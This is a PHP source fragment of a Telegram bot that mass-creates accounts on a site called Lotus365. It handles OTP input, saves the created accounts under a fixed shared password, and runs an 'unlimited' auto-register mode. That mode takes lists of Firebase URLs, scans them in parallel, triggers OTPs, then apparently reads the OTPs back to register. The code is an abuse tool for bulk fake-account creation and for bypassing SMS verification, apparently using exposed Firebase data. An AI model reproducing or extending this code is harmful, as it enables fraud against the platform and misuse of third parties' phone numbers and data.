        ["\n\n⭐ ", null], [" ENTER OTP FROM SMS:\n", null],
        [' FORMAT: "Your OTP is XXXX"', null],
    ], cancelKeyboard());
}

function handleOtpInput($uid, $chat_id, $otp) {
    $state = getState($uid);
    if (!$state || empty($state['phone'])) {
        send_premium($chat_id, [['SESSION EXPIRED.', null]], mainMenuKeyboard($uid)); return;
    }
    $otp = preg_replace('/\D/', '', $otp);
    if (!preg_match('/^\d{4,6}$/', $otp)) {
        send_premium($chat_id, [['❌', null], [' INVALID OTP. SEND 4-6 DIGITS.', null]], cancelKeyboard());
        return;
    }
    $phone = $state['phone'];
    send_premium($chat_id, [['🔄', null], [" REGISTERING...", null]]);

    $ch = buildRegisterHandle($phone, $otp);
    $r = curl_exec($ch); $code = curl_getinfo($ch, CURLINFO_HTTP_CODE); curl_close($ch);
    $j = json_decode($r, true);
    $userId = $j['data']['userid'] ?? null;

    clearState($uid);

    if (!empty($userId)) {
        saveAccount($uid, $phone, $userId);
        logAccount($phone, $userId, $uid);
        $ac = getAccountCount($uid);
        send_premium($chat_id, [
            ['✅', null], [" ACCOUNT CREATED!\n\n", null],
            ["━━━━━━━━━━━━━━━━━━\n", null],
            ['📱', null], [" PHONE: ", null], [$phone, null, 'code'], ["\n", null],
            ['🔑', null], [" PASSWORD: ", null], [SITE_PASSWORD, null, 'code'], ["\n", null],
            ['🆔', null], [" USER ID: ", null], [$userId, null, 'code'], ["\n", null],
            ["━━━━━━━━━━━━━━━━━━\n\n", null],
            ['💼', null], [" TOTAL ACCOUNTS: $ac\n\n", null],
            ['👇', null], [" USE 'MY ACCOUNTS' TO DOWNLOAD THE FILE (CONTAINS ONLY PHONE NUMBERS)", null],
        ], mainMenuKeyboard($uid));
    } else {
        send_premium($chat_id, [
            ['❌', null], [" REGISTRATION FAILED\n\n", null],
            [' WRONG OTP OR EXPIRED. TRY /create AGAIN.', null]
        ], mainMenuKeyboard($uid));
    }
}

function handleAutoStart($uid, $chat_id) {
    setState($uid, ['step'=>'awaiting_fb_url']);
    send_premium($chat_id, [
        ['⚙️', null], [" LOTUS365 AUTO REGISTER (UNLIMITED)\n\n", null],
        ["━━━━━━━━━━━━━━━━━━\n\n", null],
        ['❓', null], [" HOW IT WORKS:\n", null],
        ["1. SEND .TXT FILE (1K+ URLs OK) OR PASTE LINKS\n2. BOT SCANS ALL FIREBASE FAST (PARALLEL)\n3. SENDS OTP (PARALLEL, UNLIMITED)\n4. READS OTP & REGISTERS FAST\n\n", null],
        ['🔗', null], [" SEND FIREBASE FILE OR PASTE URLs:", null],
    ], cancelKeyboard());
}

function startAutoScanWithUrls($uid, $chat_id, $valid_urls) {
    clearState($uid);
    $scan = send_premium($chat_id, [
        ['🔍', null], [" FAST SCANNING " . count($valid_urls) . " FIREBASE...\n\n", null],
        ["📌 URL: 0/" . count($valid_urls) . " | ⏱ 0s\n", null]
    ]);
    $scan_msg_id = $scan['result']['message_id'] ?? null;
    if (!spawnWorker($uid, $chat_id, $valid_urls, $scan_msg_id)) {
        send_premium($chat_id, [['⚠️', null], [' Worker spawn failed — running sync...', null]]);
        runAutoFlow($uid, $chat_id, $valid_urls, $scan_msg_id);
    }
}

function handleFbUrlInput($uid, $chat_id, $text) {
    $valid_urls = extractFirebaseUrlsFromText($text);
    if (empty($valid_urls)) {
        send_premium($chat_id, [['❌', null], [' INVALID FIREBASE URL. SEND FILE OR RETRY:', null]], cancelKeyboard());
        return;
    }
    startAutoScanWithUrls($uid, $chat_id, $valid_urls);
}

function handleFbFileInput($uid, $chat_id, $fileId) {
    send_premium($chat_id, [['📄', null], [" READING FILE & EXTRACTING FIREBASE URLs...", null]]);
    $valid_urls = extractFirebaseUrlsFromFile($fileId);
    if ($valid_urls === null) {
        send_premium($chat_id, [['❌', null], [' FILE DOWNLOAD FAILED. TRY AGAIN:', null]], cancelKeyboard());
        return;
    }
    if (empty($valid_urls)) {
        send_premium($chat_id, [['❌', null], [' NO VALID FIREBASE URLs FOUND IN FILE.', null]], cancelKeyboard());
        return;
    }
    startAutoScanWithUrls($uid, $chat_id, $valid_urls);
}
